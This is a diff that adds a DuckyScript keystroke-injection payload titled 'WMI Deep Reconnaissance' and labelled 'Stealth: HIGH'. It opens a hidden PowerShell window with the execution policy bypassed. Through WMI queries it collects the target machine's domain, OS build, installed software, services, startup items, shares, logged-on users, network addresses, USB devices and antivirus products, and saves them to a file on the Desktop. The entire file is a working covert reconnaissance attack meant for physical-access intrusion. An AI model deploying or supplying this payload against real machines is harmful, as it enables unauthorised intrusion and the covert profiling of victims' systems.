@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | WMI Deep Reconnaissance
+REM  FLLC - by PERSON FU
+REM  Time: ~15 seconds | Stealth: HIGH
+REM  Full system inventory via WMI queries
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\wmi_recon.txt';$r=@();$r+='=== WMI DEEP RECON ===';$r+='Time: '+(Get-Date);$r+='';$r+='=== SYSTEM INFO ===';gwmi Win32_ComputerSystem|%{$r+='Name: '+$_.Name;$r+='Domain: '+$_.Domain;$r+='Manufacturer: '+$_.Manufacturer;$r+='Model: '+$_.Model;$r+='RAM: '+[math]::Round($_.TotalPhysicalMemory/1GB,1)+'GB'};$r+='';$r+='=== OS INFO ===';gwmi Win32_OperatingSystem|%{$r+=$_.Caption+' '+$_.Version;$r+='Build: '+$_.BuildNumber;$r+='Install: '+$_.InstallDate;$r+='LastBoot: '+$_.LastBootUpTime};$r+='';$r+='=== INSTALLED SOFTWARE ===';gwmi Win32_Product -ea 0|sort Name|%{$r+=$_.Name+' | '+$_.Version+' | '+$_.Vendor};$r+='';$r+='=== RUNNING SERVICES ===';gwmi Win32_Service|?{$_.State -eq 'Running'}|sort Name|%{$r+=$_.Name+' | '+$_.DisplayName+' | '+$_.StartMode+' | '+$_.PathName};$r+='';$r+='=== STARTUP ITEMS ===';gwmi Win32_StartupCommand|%{$r+=$_.Name+' | '+$_.Command+' | '+$_.User};$r+='';$r+='=== SHARED FOLDERS ===';gwmi Win32_Share|%{$r+=$_.Name+' | '+$_.Path+' | '+$_.Description};$r+='';$r+='=== LOGGED IN USERS ===';gwmi Win32_LoggedOnUser|%{$r+=$_.Antecedent};$r+='';$r+='=== DISK DRIVES ===';gwmi Win32_LogicalDisk|%{$r+=$_.DeviceID+' | '+$_.FileSystem+' | Free: '+[math]::Round($_.FreeSpace/1GB,1)+'GB / '+[math]::Round($_.Size/1GB,1)+'GB'};$r+='';$r+='=== NETWORK ADAPTERS ===';gwmi Win32_NetworkAdapterConfiguration|?{$_.IPEnabled}|%{$r+=$_.Description+' | '+($_.IPAddress-join',')+' | MAC: '+$_.MACAddress};$r+='';$r+='=== USB DEVICES ===';gwmi Win32_USBControllerDevice|%{[wmi]$_.Dependent}|%{$r+=$_.Name};$r+='';$r+='=== PRINTERS ===';gwmi Win32_Printer|%{$r+=$_.Name+' | '+$_.PortName+' | Shared: '+$_.Shared};$r+='';$r+='=== SECURITY SOFTWARE ===';gwmi -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ea 0|%{$r+=$_.displayName+' | '+$_.pathToSignedProductExe};$r|Out-File $o -Encoding UTF8"
+ENTER
+DELAY 500
